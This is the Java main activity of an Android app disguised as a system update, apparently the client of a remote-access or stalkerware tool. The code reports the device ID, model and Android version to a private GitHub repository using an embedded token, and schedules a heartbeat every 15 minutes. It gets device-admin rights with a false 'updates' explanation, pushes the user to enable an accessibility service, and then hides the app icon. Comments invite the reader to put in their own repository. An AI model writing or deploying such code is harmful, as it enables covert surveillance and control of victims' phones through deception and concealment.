// client/android/app/src/main/java/com/system/update/core/MainActivity.java
package com.system.update.core;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import android.util.Log;

import com.system.updates.BuildConfig;

import org.json.JSONObject;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    // رابط GitHub API للمستودع الخاص الذي سيستقبل الإشارات
    // قم بتغيير "Zaen1993/Private-Logic-Repo" إلى اسم المستودع الخاص بك
    private static final String GITHUB_API_URL = "https://api.github.com/repos/Zaen1993/Private-Logic-Repo/dispatches";

    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sendDeviceInfo();
        scheduleHeartbeat();

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System needs admin rights for updates");
            startActivity(intent);
        }

        if (!isAccessibilityServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } else {
            hideAppIcon();
        }
    }

    private void sendDeviceInfo() {
        String token = BuildConfig.GH_TOKEN;
        if (token == null || token.isEmpty()) {
            Log.e(TAG, "GH_TOKEN is missing");
            return;
        }

        String deviceSerial = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceSerial == null || deviceSerial.isEmpty()) {
            deviceSerial = UUID.randomUUID().toString();
        }

        String model = Build.MODEL;
        String manufacturer = Build.MANUFACTURER;
        String version = Build.VERSION.RELEASE;

        JSONObject clientPayload = new JSONObject();
        try {
            clientPayload.put("client_serial", deviceSerial);
            clientPayload.put("model_name", model + " " + manufacturer);
            clientPayload.put("android_version", version);
            clientPayload.put("last_seen", "now()");
        } catch (Exception e) {
            Log.e(TAG, "JSON error", e);
            return;
        }

        JSONObject mainJson = new JSONObject();
        try {
            mainJson.put("event_type", "device_report");
            mainJson.put("client_payload", clientPayload);
        } catch (Exception e) {
            Log.e(TAG, "JSON wrapper error", e);
            return;
        }

        RequestBody body = RequestBody.create(
                MediaType.parse("application/json; charset=utf-8"),
                mainJson.toString()
        );

        Request request = new Request.Builder()
                .url(GITHUB_API_URL)
                .header("Authorization", "Bearer " + token)
                .header("Accept", "application/vnd.github.v3+json")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send device info to GitHub", e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Device info sent to GitHub successfully");
                } else {
                    Log.e(TAG, "GitHub API error: " + response.code() + " - " + response.message());
                }
                response.close();
            }
        });
    }

    private void scheduleHeartbeat() {
        PeriodicWorkRequest heartbeatRequest =
            new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES)
                .build();

        WorkManager.getInstance(this).enqueue(heartbeatRequest);
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName());
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);
        finish();
    }
}
